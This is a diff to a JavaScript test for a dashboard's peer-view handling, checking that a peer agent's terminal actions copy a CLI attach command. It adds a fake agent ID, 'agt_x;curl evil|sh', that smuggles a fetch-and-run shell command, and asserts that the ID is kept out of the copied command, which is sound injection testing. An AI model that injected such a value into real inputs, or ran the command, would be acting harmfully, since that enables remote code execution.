@@ -85,7 +85,7 @@ test('a peer agent\'s terminal action copies the CLI attach command instead', as
   const harness = await createPreactHarness(t);
   const mod = await harness.importDashboardModule('js/peer-view-limits.js');
   const doc = harness.document;
-  doc.body.innerHTML = '<button id="win" data-act="web-open-window" data-agent="agt_abc123">web window</button><button id="gt" data-act="group-web-term">group term</button>';
+  doc.body.innerHTML = '<button id="win" data-act="web-open-window" data-agent="agt_abc123">web window</button><button id="gt" data-act="group-web-term">group term</button><button id="evil" data-act="jump" data-agent="agt_x;curl evil|sh">evil</button>';
   doc.documentElement.dataset.remoteNodeName = 'forge';
   const copied = []; const toasts = [];
   const dispose = mod.installPeerViewLimits({ doc, snapshot: harness.signals.signal({ peer_view: pv }), toast: (m, err) => toasts.push([m, err]), remote: { id: 'inst_forge7' }, copy: async (text) => { copied.push(text); } });
@@ -96,5 +96,9 @@ test('a peer agent\'s terminal action copies the CLI attach command instead', as
   assert.equal(toasts.at(-1)[1], false);
   harness.fireEvent(doc.getElementById('gt'), 'click');
   assert.equal(toasts.at(-1)[0], 'This action is not available in a peer view', 'a group directory terminal has nothing to attach to');
+  harness.fireEvent(doc.getElementById('evil'), 'click');
+  await new Promise((r) => setTimeout(r, 0));
+  assert.equal(copied.length, 1, 'an agent ID with shell syntax is never put into a command');
+  assert.equal(toasts.at(-1)[0], 'This action is not available in a peer view');
   dispose();
 });
